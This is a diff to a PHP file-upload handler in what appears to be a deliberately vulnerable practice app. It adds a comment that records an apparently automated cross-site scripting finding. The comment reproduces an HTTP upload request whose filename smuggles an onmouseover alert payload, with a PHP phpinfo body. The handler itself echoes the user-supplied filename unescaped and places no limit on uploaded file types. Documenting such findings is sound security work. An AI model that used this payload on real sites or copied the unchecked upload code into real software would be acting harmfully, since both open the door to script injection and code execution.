@@ -30,6 +30,28 @@
 				if(isset($_POST['upload'])) {
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
 					if (move_uploaded_file($_FILES['userfile']['tmp_name'], $destination)) {
+						// TODO: AI issue #3, High, Cross-site Scripting, https://github.com/rbm1718/bricks/issues/3
+						//
+						// POST /upload-1/index.php HTTP/1.1
+						// Host: localhost
+						// Accept-Encoding: identity
+						// Connection: close
+						// Content-Length: 311
+						// Content-Type: multipart/form-data; boundary=e3173bd23bac43eebe70f4172008d5c1
+						//
+						// --e3173bd23bac43eebe70f4172008d5c1
+						// Content-Disposition: form-data; name="upload"
+						//
+						// 935137890000
+						// --e3173bd23bac43eebe70f4172008d5c1
+						// Content-Disposition: form-data; name="userfile"; filename="'onmouseover='alert(1)'"
+						// Content-Type: application/octet-stream
+						//
+						// <?php phpinfo(); ?>
+						// --e3173bd23bac43eebe70f4172008d5c1--
+						//
+						//
+						// move_uploaded_file($_FILES['userfile']['tmp_name'], ('uploads/' . $_FILES['userfile']['name']))
 						echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 						}
 					else {
